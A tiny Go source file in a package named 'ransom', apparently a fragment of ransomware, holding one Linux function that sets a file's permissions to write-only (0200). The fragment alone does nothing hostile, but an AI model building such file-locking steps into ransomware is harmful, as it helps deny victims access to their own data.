//go:build linux
// +build linux

package ransom

import (
	"os"
)

func ChangePerms(file string) error {
	return os.Chmod(file, 0200)
}
